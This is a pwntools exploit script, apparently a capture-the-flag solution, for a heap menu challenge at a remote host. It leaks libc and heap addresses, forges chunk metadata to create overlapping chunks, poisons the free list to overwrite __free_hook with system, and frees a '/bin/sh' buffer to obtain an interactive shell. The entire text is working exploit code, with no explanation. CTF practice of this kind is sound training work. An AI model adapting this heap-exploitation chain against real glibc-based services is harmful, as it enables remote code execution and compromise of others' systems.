#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                brva 0x0B39

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('mc.ax', 32526)
else:
        p = process(exe.path)

def do_str(size, data):
        sla(b'>', b'1')
        sla(b'? ', str(size).encode())
        sa(b'? ',  data)
def do_tok(idx, delim):
        sla(b'>', b'2')
        sla(b'? ', str(idx).encode())
        sla(b'? ',  delim)
def do_del(idx):
        sla(b'>', b'3')
        sla(b'? ', str(idx).encode())
do_str(0x500,b'wan1naw')
do_str(0x10,b'wan1naw')
do_del(0)
do_str(0x10,b'aaaaaaa1')
do_tok(0, b'1')
p.recvuntil(b'a'*7+b'\n')
libc.address = u64(p.recvline(keepends=False).ljust(8, b'\0')) - 0x3ec0d0
info("libc address: " + hex(libc.address))
do_del(0)

do_str(0x10,b'aaaaaaaaaaaaaaa1')
do_tok(0, b'1')
p.recvuntil(b'a'*15+b'\n')
heap = u64(p.recvline(keepends=False).ljust(8, b'\0')) - 0x250
info("heap: " + hex(heap))

do_str(0x4e0,b'wan') 

payload = b'a'*0x4f0 + flat(
        0, 0x301,
        heap+0xc80,heap+0xc80
)
payload = payload.ljust(0x4f0)
do_str(0x5f0,payload) # 3
do_str(0x1f8,b'a'*(0x1f8)) # 4
do_str(0x4f0,b'wan')
do_str(0x10,b'/bin/sh') 
do_str(0x1f8,b'a') # 4
do_str(0x1f8,b'a') # 4

# GDB()

do_tok(4, b'\x01')
do_del(4)
do_str(0x1f8,b'\x00'*(0x1f0)+p64(0x300)) # 4
do_del(5)
do_del(7)
do_del(8)
do_del(4)

do_str(0x250,b'a'*0xf0 +flat(0, 0x201, libc.sym.__free_hook)) # 4
do_str(0x1f8,b'\x00'*(0x1f0)) # 4
do_str(0x1f8,p64(libc.sym.system)) # 4
sla(b'>', b'3')
sla('? ', b'6')



p.interactive()
